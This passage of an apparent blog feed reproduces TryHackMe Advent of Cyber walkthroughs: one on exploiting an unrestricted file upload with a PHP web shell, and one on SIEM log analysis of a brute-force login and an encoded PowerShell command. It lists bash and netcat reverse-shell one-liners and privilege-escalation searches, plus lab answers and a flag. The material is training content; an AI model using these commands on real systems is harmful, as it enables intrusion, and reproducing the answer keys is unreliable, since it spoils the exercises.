</span><span class="o">&lt;</span><span class="sr">/html</span><span class="err">&gt;
</span></code></pre></div></div>

<p>The above script, when accessed, displays an input field. Whatever is entered in this input field is then run against the underlying operating system using the <code class="language-plaintext highlighter-rouge">system()</code> PHP function, and the output is displayed to the user. This is the perfect file to upload to the vulnerable rail system reservation application. The vulnerability is surrounding the upload of a new profile image. So, to exploit it, we navigate to the profile picture page:</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6228f0d4ca8e57005149c3e3/room-content/6228f0d4ca8e57005149c3e3-1728053142390.png" alt="Railway profile page" /></p>

<p>Instead of a new profile picture, we can upload our malicious PHP script and update our profile:</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6228f0d4ca8e57005149c3e3/room-content/6228f0d4ca8e57005149c3e3-1728053158718.png" alt="Profile picture uploaded" /></p>

<p>In the case of this application, the RCE is possible through unrestricted file upload. Once this “profile picture” is uploaded and updated, it is stored in the <code class="language-plaintext highlighter-rouge">/admin/assets/img/profile/</code> directory. The file can then be accessed directly via <code class="language-plaintext highlighter-rouge">http://&lt;ip-address-or-localhost&gt;/&lt;projectname&gt;/admin/assets/img/profile/shell.php</code>. When this is accessed, we can then see the malicious code in action:</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6228f0d4ca8e57005149c3e3/room-content/6228f0d4ca8e57005149c3e3-1728053358466.png" alt="Malicious code in action" /> \n</p>

<p>Now, we can run commands directly against the operating system using this bar, and the output will be displayed. For example, running the command <code class="language-plaintext highlighter-rouge">pwd</code> now returns the following:</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6228f0d4ca8e57005149c3e3/room-content/6228f0d4ca8e57005149c3e3-1728053358453.png" alt="Command being run" /></p>

<h2 id="making-the-most-of-it">Making the Most of It</h2>

<p>Once the vulnerability has been exploited and you now have access to the operating system via a web shell, there are many next steps you could take depending on **a)**what your goal is and **b)**what misconfigurations are present on the system, which will determine exactly what we can do. Here are some examples of commands you could run once you have gained access and why you might run them (if the system is running on a Linux OS like our example target system): \n</p>

<table>
  <thead>
    <tr>
      <th><strong>Command</strong></th>
      <th><strong>Use</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>ls</td>
      <td>Will give you an idea of what files/directories surround you</td>
    </tr>
    <tr>
      <td>pwd</td>
      <td>Will give you an idea of where in the system you are</td>
    </tr>
    <tr>
      <td>whoami</td>
      <td>Will let you know who you are in the system</td>
    </tr>
    <tr>
      <td>hostname</td>
      <td>The system name and potentially its role in the network</td>
    </tr>
    <tr>
      <td>uname -a</td>
      <td>Will give you some system information like the OS, kernel version, and more</td>
    </tr>
    <tr>
      <td>id</td>
      <td>If the current user is assigned to any groups</td>
    </tr>
    <tr>
      <td>ifconfig</td>
      <td>Allows you to understand the system’s network setup</td>
    </tr>
    <tr>
      <td>bash -i &gt;&amp; /dev/tcp/<your-ip>/<port> 0&gt;&amp;1</port></your-ip></td>
      <td>A command used to begin a reverse shell via bash</td>
    </tr>
    <tr>
      <td>nc -e /bin/sh <your-ip> <port></port></your-ip></td>
      <td>A command used to begin a reverse shell via Netcat</td>
    </tr>
    <tr>
      <td>find / -perm -4000 -type f 2&gt;/dev/null</td>
      <td>Finds SUID (Set User ID) files, useful in privilege escalation attempts as it can sometimes be leveraged to execute binary with privileges of its owner (which is often root)</td>
    </tr>
    <tr>
      <td>find / -writable -type  f 2&gt;/dev/null | grep -v “/proc/”</td>
      <td>Also helpful in privilege escalation attempts used to find files with writable permissions \n</td>
    </tr>
  </tbody>
</table>

<p>These are just some commands that can be run following a successful RCE exploit. It’s very open-ended, and what you can do will rely on your abilities to inspect an environment and vulnerabilities in the system itself.</p>

<h2 id="practical">Practical</h2>

<p>Your task today is two-fold. First, you must access Kibana on <a href="http://MACHINE_IP:5601">MACHINE_IP:5601</a> to investigate the attack and answer the blue questions below. Then, you will proceed to Frosty Pines Resort’s website at <a href="http://frostypines.thm">http://frostypines.thm</a> and recreate the attack to answer the red questions and inform the developers what element of the website was vulnerable.</p>

<p>To review the logs of the attack on Frosty Pines Resorts, make sure you select the “<strong>frostypines-resorts</strong>” collection within ELK. Such as below:</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5de96d9ca744773ea7ef8c00-1731408603792.png" alt="selecting the frostypines-resorts collection within ELK" /></p>

<p>The date and time that you will need to use when reviewing logs will be <strong>between 11:30 and 12:00 on October 3rd 2024.</strong></p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5de96d9ca744773ea7ef8c00-1731406589164.png" alt="Highlighting the necessary time and date range within ELK for the blue element of the practical." /></p>

<p>Please note you will need to add <code class="language-plaintext highlighter-rouge">MACHINE_IP frostypines.thm</code> to your host’s file to access the hotel management system web app.</p>

<p>Answer the questions below</p>

<p>:::tip
<strong>BLUE</strong>: Where was the web shell uploaded to?</p>

<p>:::</p>

<p><strong>Answer format:</strong> /directory/directory/directory/filename.php</p>

<p>==/media/images/rooms/shell.php==</p>

<p>:::tip
<strong>BLUE</strong>: What IP address accessed the web shell?</p>

<p>:::</p>

<p>==10.11.83.34==</p>

<p>:::tip
<strong>RED</strong>: What is the contents of the flag.txt?</p>

<p>:::</p>

<p>==THM{Gl1tch_Was_H3r3}==</p>

<p>If you liked today’s task, you can learn how to harness the power of <a href="https://tryhackme.com/jr/advancedelkqueries">advanced ELK queries</a>.</p>]]></content><author><name>Michael</name></author><category term="documentation" /><category term="documentation" /><category term="AoC" /><summary type="html"><![CDATA[| **:Advent of Cyber: New Task Release!** Even if I wanted to go, their vulnerabilities wouldn’t allow it. | |—-|]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/day3-logo.png" /><media:content medium="image" url="http://localhost:4000/day3-logo.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Try Hack Me Advent of Cyber - Day 2</title><link href="http://localhost:4000/Day2" rel="alternate" type="text/html" title="Try Hack Me Advent of Cyber - Day 2" /><published>2024-12-02T00:00:00-05:00</published><updated>2024-12-02T00:00:00-05:00</updated><id>http://localhost:4000/Day2</id><content type="html" xml:base="http://localhost:4000/Day2"><![CDATA[<p>| **Advent of Cyber: New Task Release!**One man’s false positive is another man’s potpourri. |
|—-|</p>

<table>
  <thead>
    <tr>
      <th><img src="https://ci3.googleusercontent.com/meips/ADKq_NbjcwtpiqEZxM14rGt2ee0SnDMd64u1cObyR7kYo_0aYV3FIx2W3yTazUZiME6s2CUi_RhNMMpOT7UtA1rzS6QSR2zxrlotSiP4c6qRTqKG9G7o17ltlL_NOYxbTUjkkkS_gMrKIBQvpccHasqgDU-6i1nE6dA008-He3rpSpLfxm7x6Jo7HmW8Vsm6o1V-sM_7A8772Z7CpQCCvPXF5U2AZGkNsuYo55neUYfTaxaQ9Hjg=s0-d-e1-ft#https://userimg-assets.customeriomail.com/images/client-env-92874/1731074725184_McSkiddy%20-%20AoC%20Character%20Card%20326px_01JC61G5R9MD3M6SV23JW61WFK.png" alt="" /> \n  \n In day 2 of Advent of Cyber, McSkidy and the SOC team investigate suspicious login attempts. But who was behind them? **Topics Covered:**Log Analysis (False VS True Positive)</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td> </td>
    </tr>
    <tr>
      <td> </td>
    </tr>
  </tbody>
</table>

<h1 id="the-story">The Story</h1>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1730369227263.png" alt="Task banner for day 2." /></p>

<p>It’s the most wonderful time of the year again, and it’s also the most stressful day for Wareville’s Security Operations Center (SOC) team. Despite the overwhelming alerts generated by the new and noisy rules deployed, Wareville’s SOC analysts have been processing them nonstop to ensure the safety of the town.</p>

<p>However, the SOC analysts are now burning out of all the workload needed before Christmas. Numerous open cases are still pending, and similar alerts are still firing repeatedly, making them think of the possibility of false positives out of all this mess.</p>

<p>Now, help the awesome Wareville’s SOC team analyse the alerts to determine whether the rumour is true—that Mayor Malware is instigating chaos within the town.</p>

<h2 id="true-positives-or-false-positives">True Positives or False Positives?</h2>

<p>In a SOC, events from different devices are sent to the SIEM, which is the single source of truth where all the information and events are aggregated. Certain rules (Detection Engineering rules) are defined to identify malicious or suspicious activity from these events. If an event or set of events fulfils the conditions of a rule, it triggers an alert. A SOC analyst then analyses the alert to identify if the alert is a True Positive (TP) or a False Positive (FP). An alert is considered a TP if it contains actual malicious activity. On the flip side, if the alert triggers because of an activity that is not actually malicious, it is considered an FP. This might seem very simple in theory, but practically, separating TPs from FPs can be a tedious job. It can sometimes become very confusing to differentiate between an attacker and a system administrator.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1730369255180.png" alt="Identifying true vs. false positives." /> \n</p>

<h2 id="making-a-decision">Making a Decision</h2>

<p>While it is confusing to differentiate between TPs and FPs, it is very crucial to get it right. If a TP is falsely classified as an FP, it can lead to a significant impact from a missed cyber attack. If an FP is falsely classified as a TP, precious time will be spent focusing on the FP, which might lead to less focus on an actual attack. So, how exactly do we ensure that we perform this crucial job effectively? We can use the below pointers to guide us.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1730369772259.png" alt="Monitoring dashboards." /><strong>Using the SOC Superpower</strong></p>

<p>The SOC has a superpower. When they are unsure whether an activity is performed by a malicious actor or a legitimate user, they can just confirm with the user. This privilege is not available to the attacker. A SOC analyst, on the other hand, can just send an email or call the relevant person to get confirmation of a certain activity. In mature organisations, any changes that might trigger an alert in the SOC often require Change Requests to be created and approved through the IT change management process. Depending on the process, the SOC team can ask the users to share Change Request details for confirmation. Surely, if it is a legitimate and approved activity, it must have an approved Change Request.</p>

<p><strong>Context</strong></p>

<p>While it might seem like using the SOC superpower makes things super easy, that is not always the case. There are cases which can act as Kryptonite to the SOC superpower:</p>

<ul>
  <li>If an organisation doesn’t have a change request process in place.</li>
  <li>The performed activity was outside the scope of the change request or was different from that of the approved change request.</li>
  <li>The activity triggered an alert, such as copying files to a certain location, uploading a file to some website, or a failed login to a system.</li>
  <li>An insider threat performed an activity they are not authorised to perform, whether intentionally or unintentionally.</li>
  <li>A user performed a malicious activity via social engineering from a threat actor.</li>
</ul>

<p>In such scenarios, it is very important for the SOC analyst to understand the context of the activity and make a judgement call based on their analysis skills and security knowledge. While doing so, the analyst can look at the past behaviour of the user or the prevalence of a certain event or artefact throughout the organisation or a certain department. For example, if a certain user from the network team is using Wireshark, there is a chance that other users from the same team also use Wireshark. However, Wireshark seen on a machine belonging to someone from HR or finance should rightfully raise some eyebrows.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1730370031153.png" alt="Finding the needle in a haystack." /><strong>Correlation</strong></p>

<p>When building the context, the analyst must correlate different events to make a story or a timeline. Correlation entails using the past and future events to recreate a timeline of events. When performing correlation, it is important to note down certain important artefacts that can then be used to connect the dots. These important artefacts can include IP addresses, machine names, user names, hashes, file paths, etc.</p>

<p>Correlation requires a lot of hypothesis creation and ensuring that the evidence supports that hypothesis. A hypothesis can be something like the user downloaded malware from a spoofed domain. The evidence to support this can be proxy logs that support the hypothesis that a website was visited, the website used a spoofed domain name, and a certain file was downloaded from that website. Now, let’s say, we want to identify whether the malware executed through some vulnerability in an application or a user intentionally executed the malware. To see that, we might look at the parent process of the malware and the command line parameters used to execute the said malware. If the parent process is Windows Explorer, we can assume the user executed the malware intentionally (or they might have been tricked into executing it via social engineering), but if the parent process is a web browser or a word processor, we can assume that the malware was not intentionally executed, but it was executed because of a vulnerability in the said application.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1730369457912.png" alt="Analysts received an alert." /></p>

<h2 id="is-this-a-tp-or-an-fp">Is this a TP or an FP?</h2>

<p>Similar to every SOC, the analysts in the Wareville SOC also need to differentiate TPs from FPs. This becomes especially difficult for them near Christmas when the analysts face alert fatigue. High chances of misclassification of TPs into FPs and vice versa are present in such times. The analysts, therefore, appreciate any help they could get from us in this crucial time. To make matters worse, the office of the Mayor has sent the analysts an alert informing them of multiple encoded powershell commands run on their systems. Perhaps we can help with that.</p>

<p>Once the machine is up and running, we can connect to the Elastic SIEM by visiting <a href="https://10-10-46-102.p.thmlabs.com">https://10-10-46-102.p.thmlabs.com</a> in your browser using the following credentials:</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/0cbfa0d0f3a7f16cefa9fddd04b6de8d.png" alt="TryHackMe Credentials" /></p>

<table>
  <thead>
    <tr>
      <th><strong>URL</strong></th>
      <th>https://10-10-46-102.p.thmlabs.com</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><strong>Username</strong></td>
      <td>elastic</td>
    </tr>
    <tr>
      <td><strong>Password</strong></td>
      <td>elastic</td>
    </tr>
  </tbody>
</table>

<p>Once we log in, we can click the menu in the top-left corner and go to the <code class="language-plaintext highlighter-rouge">Discover</code> tab to see the events.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1730130654839.png" alt="Instructions to access the Discover console." /> \n</p>

<p>According to the alert sent by the Mayor’s office, the activity occurred on Dec 1st, 2024, between 0900 and 0930. We can set this as our time window by clicking the timeframe settings in the upper-right corner. Note that we need to click the <strong>Absolute</strong> tab and set the exact timeframe we want to view. Lastly, click the <strong>Update</strong> button to apply the changes.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1730130936812.png" alt="Instructions to configure the search timeframe." /> \n</p>

<p>After updating the settings, we see 21 events in the mentioned timeframe.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/61306d87a330ed00419e22e7-1728231315005.png" alt="Initial query results from the given timeframe." /> \n</p>

<p>In their current form, these events don’t look very easily readable. We can use the fields in the left pane to add columns to the results and make them more readable. Hovering on the field name in the left pane will allow adding that field as a column, as shown below.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/61306d87a330ed00419e22e7-1728121458086.png" alt="Instructions to add fields as table columns." /></p>

<p>Since we are looking for events related to PowerShell, we would like to know the following details about the logs.</p>

<ul>
  <li>The hostname where the command was run. We can use the <code class="language-plaintext highlighter-rouge">host.hostname</code> field as a column for that.</li>
  <li>The user who performed the activity. We can add the <code class="language-plaintext highlighter-rouge">user.name</code> field as a column for this information.</li>
  <li>We will add the <code class="language-plaintext highlighter-rouge">event.category</code> field to ensure we are looking at the correct event category.</li>
  <li>To know the actual commands run using PowerShell, we can add the <code class="language-plaintext highlighter-rouge">process.command_line</code> field.</li>
  <li>Finally, to know if the activity succeeded, we will add the <code class="language-plaintext highlighter-rouge">event.outcome</code> field.</li>
</ul>

<p>Once we have added these fields as columns, we will see the results in a format like this.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/61306d87a330ed00419e22e7-1728231315014.png" alt="View after adding the field columns." /> \n</p>

<p>Interesting! So, it looks like someone ran the same encoded PowerShell command on multiple machines. Another thing to note here is that before each execution of the PowerShell command, we see an authentication event, which was successful.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1730132203152.png" alt="Authentication and PowerShell execution pattern." /> \n</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1730369342463.png" alt="It seems like Glitch is involved." />This activity is observed individually on each machine, and the time difference between the login and PowerShell commands looks very precise. Best practices dictate that named accounts are used for any kind of administrator activity so that there is accountability and attribution for each administrative activity performed. The usage of a generic admin account here also seems suspicious. On asking, the analysts informed us that this account is used by two administrators who were not in the office when this activity occurred. Hmmm, something is definitely not right. Are these some of Glitch’s shenanigans? Is Christmas in danger? We need to find out who ran these commands.</p>

<p>Let’s also add the <code class="language-plaintext highlighter-rouge">source.ip</code> field as a column to find out who ran the PowerShell commands.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1730132260949.png" alt="Adding source.ip field column to the current view." /> \n</p>

<p>Since the <code class="language-plaintext highlighter-rouge">source.ip</code> field is only available for the authentication events, we can filter out the process events to see if there is a pattern.  To do that, we can hover over the <code class="language-plaintext highlighter-rouge">event.category</code> field in one of the process events. We will see the option to filter only for this value (+ sign) or filter out the value (- sign), as seen below. Let’s filter for authentication events by clicking the plus (+) sign beside it to show only those in the results.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/61306d87a330ed00419e22e7-1728123886843.png" alt="Filtering using the plus button." /></p>

<p>As a result, you can see that the output only renders the authentication events. Since the result does not give useful insights, let’s remove it for now. You can do this by clicking the <code class="language-plaintext highlighter-rouge">x</code> beside the filter.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1730133793388.png" alt="Removing the filter using the x button." /> \n</p>

<p>Since the timeframe we previously used was for the PowerShell events, and the authentication events might have been coming from before that, we will need to expand the search to understand the context and the historical events for this user. Let’s see if we have any events from the user from the 29th of November to the 1st of December. Updating the time filter for these days, the results look like this.</p>

<p><strong>Note: Remember to remove the</strong> <code class="language-plaintext highlighter-rouge">event.category</code> filter before this step.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1730133980599.png" alt="Adjusting the timeframe to November 29 to December 1." /> \n</p>

<p>Woah, there have been more than 6800 events in these three days, and we see a spike at the end of the logs. However, even though we used the time filter for the day end on the 1st of December, we see no events after successful PowerShell execution. There have also been a lot more authentication events in the previous days than on the 1st of December.</p>

<p>To understand the events further, let’s filter for our <code class="language-plaintext highlighter-rouge">user.name</code> with <code class="language-plaintext highlighter-rouge">service_admin</code> and <code class="language-plaintext highlighter-rouge">source.ip</code> with <code class="language-plaintext highlighter-rouge">10.0.11.11</code> to narrow our search.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/61306d87a330ed00419e22e7-1728233609356.png" alt="Applied source IP and username filters." /> \n</p>

<p>Uh-oh! It looks like all these events have been coming from the same user and the same IP address. We definitely need to investigate further. This also does not explain the spike. Let’s filter for authentication events first by clicking the plus (+) button beside it.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1730134648151.png" alt="Filtering authentication events using the plus button." /> \n</p>

<p>Moreover, let’s filter out the Source IP here to see if we can find the IP address that caused the spike. This can be done by clicking the minus (-) button beside it.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1730134648084.png" alt="Filtering out the source IP using the minus button." /> \n</p>

<p>After applying the filters, the expected result will be similar to the image below.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1730134858251.png" alt="Updated results based on the new filters." /> \n</p>

<p>Scrolling down, we see many events for failed logins. We also see that the IP address for the spike (ending in <strong>.255.1</strong>) differs from the one we saw for the events continuously coming in the previous days (10.0.11.11). The analysts have previously investigated this and found that a script with expired credentials was causing this issue. However, that script was updated with a fresh set of credentials. Anyhow, this might just be another script. Let’s find out.</p>

<p>Let’s remove the <code class="language-plaintext highlighter-rouge">source IP</code> filter so we can focus on authentication events close to the spike. After applying the new filter, we see that the failed logins stopped a little while after the successful login from the new IP.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1730135308423.png" alt="Authentication patterns close to the spike." /> \n</p>

<p>Our suspicions are rising. It seems that someone tried a brute-force attack on December 1st, as shown by the same filters applied above.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1730135585773.png" alt="Indicators of brute-forcing attempts." /> \n</p>

<p>The results also showed that they succeeded with the brute-force attempt because of the successful authentication attempt and quickly ran some PowerShell commands on the affected machines. Once the PowerShell commands were run, we didn’t see any further login attempts. This looks like a TP, and there needs to be an escalation so that McSkidy can help us respond to this incident.</p>

<h2 id="christmas-in-danger">Christmas in Danger?</h2>

<p>The alarms have gone off, and McSkidy has been called to help take this incident further. The analysts have briefed McSkidy about the incident. McSkidy observed that nobody had actually looked at what the PowerShell command contained. Since the command was encoded, it needs to be decoded. McSkidy changed the filters with <code class="language-plaintext highlighter-rouge">event.category: process</code> to take a deeper look at the PowerShell commands.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1730135920764.png" alt="New filter applied to view PowerShell commands." /> \n</p>

<p>We can see the PowerShell command in the <code class="language-plaintext highlighter-rouge">process.command_line</code> field.</p>

<p><code class="language-plaintext highlighter-rouge">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -EncodedCommand SQBuAHMAdABhAGwAbAAtAFcAaQBuAGQAbwB3AHMAVQBwAGQAYQB0AGUAIAAtAEEAYwBjAGUAcAB0AEEAbABsACAALQBBAHUAdABvAFIAZQBiAG8AbwB0AA==</code></p>

<p>McSkidy knows that Encoded PowerShell commands are generally Base64 Encoded and can be decoded using tools such as <a href="https://gchq.github.io/CyberChef/">CyberChef</a>. Since the command might contain some sensitive information and, therefore, must not be submitted on a public portal, McSkidy spins up her own instance of CyberChef hosted locally. McSkidy started by pasting the encoded part of the command in the Input pane in CyberChef.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1730131256096.png" alt="Using CyberChef to decode the PowerShell command." /> \n</p>

<p>Since it is a Base64 encoded command, McSkidy used two recipes, named <code class="language-plaintext highlighter-rouge">FromBase64</code> and <code class="language-plaintext highlighter-rouge">Decode text</code> from the left pane. Note that McSkidy configured the <strong>Decode text</strong> to <strong>UTF-16LE (1200)</strong> since it is the encoding used by PowerShell for Base64.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1730131884795.png" alt="Applying recipes to decode the PowerShell command." /> \n</p>

<p>The result provided a sigh of relief to McSkidy, who had feared that the Christmas had been ruined. Someone had come in to help McSkidy and the team secure their defences, but who?</p>

<h2 id="villain-or-hero">Villain or Hero?</h2>

<p>McSkidy further analysed the secret hero and came to a startling revelation. The credentials for the script in the machines that ran the Windows updates were outdated. Someone brute-forced the systems and fixed the credentials after successfully logging in. This was evident from the fact that each executed PowerShell command was preceded by a successful login from the same Source IP, causing failed logins over the past few days. And what’s even more startling? It was Glitch who accessed <strong>ADM-01</strong> and fixed the credentials after McSkidy confirmed who owned the IP address.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1730136203704.png" alt="Evidence that Glitch fixed the recurring issue." /> \n</p>

<p>This meant that the people of Wareville had misunderstood Glitch, who was just trying to help shore up the defences. But if Glitch was the one helping the defences, who was trying to sabotage it? Was it the Mayor who informed the SOC about these ‘suspicious’ PowerShell commands? Just like alerts aren’t always what they seem in a SOC, so was the case here at Wareville with people. As hard as it was to differentiate between a TP and an FP, so was the case with the Mayor and Glitch. However, McSkidy can perhaps use the evidence-based deduction skills learned in a SOC to make this difference easier for the people of Wareville.</p>

<p>:::info
Answers</p>

<p>:::</p>

<p>:::tip
What is the name of the account causing all the failed login attempts?</p>

<p>:::</p>

<p>service_admin</p>

<p>:::tip
How many failed logon attempts were observed?</p>

<p>:::</p>

<p>6791</p>

<p>:::tip
What is the IP address of Glitch?</p>

<p>:::</p>

<p>10.0.255.1</p>

<p>:::tip
When did Glitch successfully logon to ADM-01? Format: MMM D, YYYY HH:MM:SS.SSS</p>

<p>:::</p>

<p>Dec 1, 2024 08:54:39.000</p>

<p>:::tip
What is the decoded command executed by Glitch to fix the systems of Wareville?</p>

<p>:::</p>

<p>Install-WindowsUpdate -AcceptAll -AutoReboot</p>

<p>If you enjoyed this task, feel free to check out the <a href="https://tryhackme.com/r/room/investigatingwithelk101">Investigating with ELK 101</a> room.</p>]]></content><author><name>Michael</name></author><category term="documentation" /><category term="documentation" /><category term="AoC" /><category term="Day2" /><summary type="html"><![CDATA[| **Advent of Cyber: New Task Release!**One man’s false positive is another man’s potpourri. | |—-|]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/day2-logo.png" /><media:content medium="image" url="http://localhost:4000/day2-logo.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>